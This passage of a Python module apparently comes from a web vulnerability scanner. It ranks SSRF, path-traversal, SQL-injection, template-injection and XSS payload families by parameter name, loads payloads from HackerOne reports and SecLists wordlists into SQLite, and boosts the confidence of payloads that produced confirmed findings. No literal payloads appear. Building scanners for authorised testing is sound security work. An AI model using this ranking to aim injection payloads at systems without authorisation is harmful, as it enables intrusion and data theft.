        "callback": {"callback": 1.40, "aws_bypass": 1.20, "internal_probe": 1.10},
        "webhook":  {"callback": 1.40, "aws_bypass": 1.20, "aws_imds": 1.10},
        "redirect": {"callback": 1.30, "aws_bypass": 1.20},
        "proxy":    {"internal_probe": 1.35, "aws_bypass": 1.20, "callback": 1.15},
        "src":      {"aws_imds": 1.20, "gcp_imds": 1.20, "internal_probe": 1.15},
        "fetch":    {"aws_imds": 1.25, "aws_bypass": 1.20, "callback": 1.15},
        "endpoint": {"callback": 1.35, "aws_bypass": 1.20, "internal_probe": 1.10},
        # LFI params — file vs path imply different traversal patterns
        "file":     {"traversal_basic": 1.30, "traversal_encoded": 1.20,
                     "traversal_bypass": 1.15},
        "path":     {"traversal_bypass": 1.30, "traversal_encoded": 1.20,
                     "traversal_basic": 1.15},
        "template": {"traversal_bypass": 1.35, "traversal_encoded": 1.20},
        "page":     {"traversal_basic": 1.25, "traversal_encoded": 1.15},
        "include":  {"traversal_bypass": 1.30, "traversal_encoded": 1.20},
        # SQLi params — numeric IDs vs filter/sort/query
        "id":       {"error_basic": 1.35, "time_blind": 1.20, "union_basic": 1.15},
        "filter":   {"union_basic": 1.35, "error_basic": 1.20, "time_blind": 1.10},
        "sort":     {"error_basic": 1.30, "time_blind": 1.20, "union_basic": 1.10},
        "order":    {"error_basic": 1.30, "time_blind": 1.20, "union_basic": 1.10},
        "query":    {"error_basic": 1.25, "time_blind": 1.20, "union_basic": 1.20},
        "search":   {"error_basic": 1.20, "time_blind": 1.15, "union_basic": 1.20},
        # SSTI params
        "template": {"jinja2": 1.40, "mako_dollar": 1.20, "erb": 1.10, "smarty": 1.10},
        "render":   {"jinja2": 1.35, "mako_dollar": 1.25, "erb": 1.10},
        "view":     {"smarty": 1.35, "jinja2": 1.20, "erb": 1.20},
        # XSS params
        "q":        {"svg_event": 1.30, "img_onerror": 1.20, "attr_break": 1.15},
        "search":   {"svg_event": 1.25, "img_onerror": 1.25, "attr_break": 1.15},
        "name":     {"attr_break": 1.30, "img_onerror": 1.20, "script_basic": 1.15},
        "body":     {"script_basic": 1.30, "attr_break": 1.20, "js_context": 1.20},
        "comment":  {"script_basic": 1.35, "attr_break": 1.20},
    }

    if param_name:
        _affinity = _PARAM_FAMILY_AFFINITY.get(param_name.lower(), {})
        if _affinity:
            def _boosted_score(row) -> float:
                fid = row["family_id"]
                mul = 1.0
                for fragment, factor in _affinity.items():
                    if fragment in fid:
                        mul = max(mul, factor)
                return row["family_score"] * row["confidence"] * mul
            rows = sorted(rows, key=_boosted_score, reverse=True)

    # No-param path: rows already sorted by SQL ORDER BY (family_score*confidence) DESC

    seen_norm: set = set()
    result: list   = []
    for r in rows:
        norm = _normalise(r["literal"])
        if norm in seen_norm:
            continue
        seen_norm.add(norm)
        result.append(r["literal"])
        if len(result) >= top_n:
            break

    return result


def get_stats() -> Dict:
    """DB statistics for UI display."""
    _ensure_bootstrapped()
    with _db() as conn:
        total_f = conn.execute("SELECT COUNT(*) FROM payload_families").fetchone()[0]
        total_v = conn.execute("SELECT COUNT(*) FROM payload_variants").fetchone()[0]
        by_bug  = dict(conn.execute(
            "SELECT bug_type, COUNT(*) FROM payload_families GROUP BY bug_type ORDER BY 2 DESC"
        ).fetchall())
        by_tier = dict(conn.execute(
            "SELECT safety_tier, COUNT(*) FROM payload_variants GROUP BY safety_tier"
        ).fetchall())
        by_surf = dict(conn.execute(
            "SELECT surface, COUNT(*) FROM payload_families GROUP BY surface ORDER BY 2 DESC"
        ).fetchall())
        top_fams = conn.execute(
            "SELECT family_id, bug_type, family_score FROM payload_families ORDER BY family_score DESC LIMIT 5"
        ).fetchall()
        last_rebuild = conn.execute(
            "SELECT * FROM payload_rebuild_log ORDER BY id DESC LIMIT 1"
        ).fetchone()
    _attempted = last_rebuild["variants"] if last_rebuild else total_v
    return {
        "families":        total_f,
        "variants":        total_v,          # actual COUNT(*) in DB
        "variants_attempted": _attempted,    # bootstrap insert attempts (may be > variants due to hash dedup)
        "dedup_rejected":  max(0, _attempted - total_v),
        "by_bug_type":     by_bug,
        "by_safety_tier":  by_tier,
        "by_surface":      by_surf,
        "top_families":    [dict(r) for r in top_fams],
        "last_rebuild":    dict(last_rebuild) if last_rebuild else None,
        "default_tiers":   list(DEFAULT_TIERS),
    }


def ingest_from_h1(bug_type: str, payloads: List[str], source_url: str = "") -> int:
    """
    Ingest H1-observed payloads into the payload intelligence DB.
    Each payload is normalised, deduplicated, and assigned low_risk tier.
    Returns count of new variants added.
    """
    _ensure_bootstrapped()
    added = 0
    # Map H1 bug types to canonical family_id prefix
    family_map = {
        "xss":      "xss.script_basic",
        "sqli":     "sqli.error_basic",
        "ssrf":     "ssrf.aws_imds",
        "lfi":      "lfi.traversal_basic",
        "ssti":     "ssti.jinja2",
        "redirect": "redirect.absolute",
        "cors":     "cors.arbitrary_origin",
        "idor":     "idor.int_increment",
    }
    fam_id = family_map.get(bug_type, f"{bug_type}.generic")

    with _db() as conn:
        # Ensure a generic family exists for this bug_type if not in canonical set
        exists = conn.execute(
            "SELECT 1 FROM payload_families WHERE family_id = ?", (fam_id,)
        ).fetchone()
        if not exists:
            conn.execute("""
                INSERT OR IGNORE INTO payload_families
                  (family_id, bug_type, family_name, template, safety_tier, family_score)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (fam_id, bug_type, f"{bug_type} (H1 observed)",
                  f"{{payload_core}}", TIER_LOW_RISK, 40.0))

        for literal in payloads:
            if not literal or len(literal) > 500:
                continue
            ph   = _sha(literal)
            norm = _normalise(literal)
            try:
                conn.execute("""
                    INSERT OR IGNORE INTO payload_variants
                      (family_id, literal, payload_hash, template_hash,
                       normalized, confidence, safety_tier, source_type, source_url)
                    VALUES (?,?,?,?,?,0.7,?,?,?)
                """, (fam_id, literal, ph, _sha(norm), norm,
                      TIER_LOW_RISK, "h1_observed", source_url))
                if conn.execute("SELECT changes()").fetchone()[0]:
                    added += 1
                    # Update family source_count
                    conn.execute(
                        "UPDATE payload_families SET source_count = source_count + 1 WHERE family_id = ?",
                        (fam_id,)
                    )
            except Exception:
                pass
    return added


# ══════════════════════════════════════════════════════════════════════════════
# SECLISTS INGESTION (local wordlist files)
# ══════════════════════════════════════════════════════════════════════════════

_SECLISTS_PATHS = {
    "xss": [
        "/usr/share/seclists/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt",
        "/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt",
        "~/SecLists/Fuzzing/XSS/XSS-Jhaddix.txt",
    ],
    "sqli": [
        "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt",
        "~/SecLists/Fuzzing/SQLi/Generic-SQLi.txt",
    ],
    "lfi": [
        "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt",
        "~/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt",
    ],
    "ssrf": [
        "/usr/share/seclists/Fuzzing/SSRF/SSRF-sheriff.txt",
    ],
}


def ingest_from_seclists(bug_type: str = "") -> Dict:
    """
    Ingest payloads from local SecLists wordlist files.
    Only reads files that exist on disk. Skips if SecLists not installed.
    Assigns TIER_LOW_RISK — same as canonical payloads.
    Returns dict of {bug_type: added_count}.
    """
    import os as _os
    _ensure_bootstrapped()

    targets = {bug_type: _SECLISTS_PATHS[bug_type]} if bug_type and bug_type in _SECLISTS_PATHS               else _SECLISTS_PATHS

    results: Dict[str, int] = {}
    for bt, paths in targets.items():
        added = 0
        for raw_path in paths:
            path = _os.path.expanduser(raw_path)
            if not _os.path.isfile(path):
                continue
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
                added += ingest_from_h1(bt, lines[:500], source_url=f"seclists:{path}")
                # Update source record
                with _db() as conn:
                    conn.execute("""
                        INSERT OR REPLACE INTO payload_sources
                          (name, url, source_type, families_added, last_ingested)
                        VALUES (?,?,?,?,?)
                    """, (f"seclists_{bt}", path, "seclists", added, time.time()))
                log.info(f"[payload_intel] seclists {bt}: {added} new variants from {path}")
                break   # first found path wins
            except Exception as e:
                log.debug(f"[payload_intel] seclists {bt}: {e}")
        results[bt] = added
    return results


# ══════════════════════════════════════════════════════════════════════════════
# BACKGROUND REBUILD STATE
# ══════════════════════════════════════════════════════════════════════════════

_rebuild_state: Dict = {
    "running":  False,
    "started":  None,
    "finished": None,
    "families": 0,
    "variants": 0,
    "status":   "idle",
}


def rebuild_background(include_seclists: bool = False) -> bool:
    """
    Start background index rebuild. Returns False if already running.
    Thread-safe state tracking via _rebuild_state dict.
    """
    if _rebuild_state["running"]:
        return False

    import threading

    def _run():
        _rebuild_state["running"] = True
        _rebuild_state["started"] = time.time()
        _rebuild_state["status"]  = "running"
        try:
            result = bootstrap(force=True)
            _rebuild_state["families"] = result["families"]
            _rebuild_state["variants"] = result["variants"]
            if include_seclists:
                sl = ingest_from_seclists()
                _rebuild_state["seclists"] = sl
            _rebuild_state["status"] = "ok"
        except Exception as e:
            _rebuild_state["status"] = f"error: {e}"
            log.error(f"[payload_intel] rebuild failed: {e}")
        finally:
            _rebuild_state["running"]  = False
            _rebuild_state["finished"] = time.time()

    threading.Thread(target=_run, daemon=True, name="payload-rebuild").start()
    return True


def rebuild_status() -> Dict:
    """Return current rebuild state. Safe to call at any time."""
    state = dict(_rebuild_state)
    if state.get("started") and state.get("finished"):
        state["elapsed_s"] = round(state["finished"] - state["started"], 1)
    elif state.get("started"):
        state["elapsed_s"] = round(time.time() - state["started"], 1)
    return state


# ══════════════════════════════════════════════════════════════════════════════
# PHASE 10 — HONEST LIMITATIONS
# ══════════════════════════════════════════════════════════════════════════════
LIMITATIONS = """
Payload Intelligence — Honest Limitations
==========================================

WHAT IS REGEX/HEURISTIC:
  - _normalise(): regex-based, misses semantic near-duplicates that differ structurally
  - _family_score() weights (variant_count×3, tier×40, conf×40): hand-tuned, not learned
  - ingest_from_h1(): payloads are strings extracted by h1_ingest.py regex patterns —
    extraction quality depends on how well-formed the H1 report text was

WHAT IS WEAK:
  - 27 canonical families cover the most common cases; exotic encodings (UTF-7, HP-UX
    paths, EBCDIC) are not represented
  - confidence values on canonical variants are manually assigned estimates, not measured
  - lab_only tier is defined but no lab_only payloads are in the canonical set yet —
    the tier exists for future use or manual additions

WHAT IS DISABLED BY DEFAULT (safety):
  - TIER_LAB_ONLY: requires include_lab=True in every call — never returned automatically
  - TIER_MANUAL_REVIEW: never returned by any automated function; reserved for manual use
  - lab_only payloads (e.g. confirmed RCE, aggressive SSRF) would need explicit addition

WHAT COULD FAIL AT 100K SCALE:
  - select_payloads() JOIN across families × variants: at 100k variants, needs a
    covering index on (family_id, safety_tier, confidence DESC). Current indexes are
    separate and SQLite will choose correctly up to ~50k rows, then slow down.
  - bootstrap(force=True): full DELETE + re-INSERT holds WAL write lock for the
    duration — at 100k variants this blocks concurrent reads for ~5s.
    Fix: use INSERT OR REPLACE without DELETE, then prune in a second pass.
  - _normalise() called at insert time: O(N) per payload, fine at 100k.

WHAT NEEDS FUTURE REFACTOR:
  - Replace hand-tuned family_score weights with a feedback loop that reads which
    payloads actually produced findings in scanner runs (via engine/learning.py)
  - Add FTS5 virtual table on payload_variants.normalized for fast similarity search
  - Merge with engine/learning.py get_best_payloads() to avoid duplicate storage
  - Add seclists ingestion to app startup (auto-detect if /usr/share/seclists exists)
"""


# ══════════════════════════════════════════════════════════════════════════════
# FEEDBACK — record confirmed payload hits to boost confidence scores
# ══════════════════════════════════════════════════════════════════════════════

def record_payload_hit(bug_type: str, payload: str) -> bool:
    """
    Record that a payload produced a confirmed finding.
    Increments hit_count on the matching variant and boosts its confidence
    (capped at 0.98 — never reaches 1.0 so it stays re-rankable).
    Returns True if the variant was found and updated, False otherwise.

    Called from scanner.F() on every confirmed finding with a payload= field.
    Non-blocking: caller silently ignores all exceptions.
    """
    _ensure_bootstrapped()
    norm = _normalise(payload)
    ph   = _sha(payload)
    try:
        with _db() as conn:
            # Try exact hash match first (fastest)
            row = conn.execute(
                "SELECT id, confidence, hit_count FROM payload_variants WHERE payload_hash = ?",
                (ph,)
            ).fetchone()
            if not row:
                # Try normalised match (handles minor formatting differences)
                row = conn.execute(
                    "SELECT id, confidence, hit_count FROM payload_variants WHERE normalized = ?",
                    (norm,)
                ).fetchone()
            if not row:
                return False

            vid       = row["id"]
            cur_conf  = row["confidence"]
            hit_count = (row["hit_count"] or 0) + 1

            # Boost confidence toward 0.98 asymptotically:
            # Each hit closes 30% of the gap between current and 0.98.
            new_conf  = min(0.98, cur_conf + (0.98 - cur_conf) * 0.30)

            conn.execute(
                "UPDATE payload_variants SET confidence = ?, hit_count = ? WHERE id = ?",
                (round(new_conf, 4), hit_count, vid)
            )
            log.debug(f"[payload_intel] hit: bug={bug_type} conf {cur_conf:.3f}→{new_conf:.3f} "
                      f"hits={hit_count} payload={payload[:40]!r}")
            return True
    except Exception as e:
        log.debug(f"[payload_intel] record_payload_hit error: {e}")
        return False


def get_hit_stats() -> dict:
    """Return variants that have been confirmed by real findings, sorted by hit count."""
    _ensure_bootstrapped()
    with _db() as conn:
        # Check if hit_count column exists
        cols = [r[1] for r in conn.execute("PRAGMA table_info(payload_variants)").fetchall()]
        if "hit_count" not in cols:
            return {"error": "hit_count column not present — run bootstrap(force=True)"}
        rows = conn.execute(
            "SELECT v.literal, v.confidence, v.hit_count, f.bug_type, f.family_id "
            "FROM payload_variants v JOIN payload_families f ON f.family_id = v.family_id "
            "WHERE v.hit_count > 0 ORDER BY v.hit_count DESC, v.confidence DESC LIMIT 50"
        ).fetchall()
    return {
        "confirmed_variants": len(rows),
        "hits": [{"payload": r["literal"], "bug_type": r["bug_type"],
                  "hits": r["hit_count"], "confidence": r["confidence"]}
                 for r in rows],
    }
